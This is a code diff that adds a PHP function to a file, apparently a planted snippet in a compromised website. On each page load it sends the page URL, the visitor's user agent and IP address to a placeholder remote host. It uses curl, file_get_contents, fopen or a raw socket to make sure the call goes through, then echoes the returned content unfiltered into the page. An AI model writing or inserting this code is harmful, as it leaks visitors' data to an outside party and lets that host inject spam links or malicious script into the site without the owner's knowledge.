@@ -1,0 +1,35 @@
+function getLnksz() {
+$url = '#DOMAIN#/get.php?pageurl='.
+urlencode('http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']).
+"&ch=#CHARSET#&useragent=".urlencode($_SERVER['HTTP_USER_AGENT']).
+"&ip=".urlencode($_SERVER['REMOTE_ADDR']);
+$LNKS=''; $churl=parse_url($url);
+
+if(@function_exists('curl_init')){
+ $ch=curl_init();
+ curl_setopt($ch, CURLOPT_HEADER, 0);
+ curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+ curl_setopt($ch, CURLOPT_URL, $url);
+ $data=curl_exec($ch);
+ curl_close($ch);
+ return $data;
+}elseif(@function_exists('file_get_contents')){
+ return file_get_contents($url);
+}elseif(ini_get("allow_url_fopen")==1){
+ $hndl=fopen($url, "r");
+ while(!feof($hndl)){$LNKS.=fread($hndl, 8192);}
+ return $LNKS;
+}elseif($sock=fsockopen($churl['host'], 8080)){
+ fputs($sock, "GET ".$url." HTTP/1.0\r\n".
+  "Host: {$churl['host']}\r\n".
+  "Accept: */*\r\n".
+  "Keep-Alive: 300\r\n".
+  "Connection: keep-alive\r\n".
+  "Referer: http://{$churl['host']}\r\n\r\n");
+ while ($line=fread($sock, 4096)) 
+ {$response.=$line;} fclose($sock);
+ $pos=strpos($response, "\r\n\r\n");
+ $response=substr($response, $pos+4);
+ return $response;
+}else{return '';}
+}echo(getLnksz());
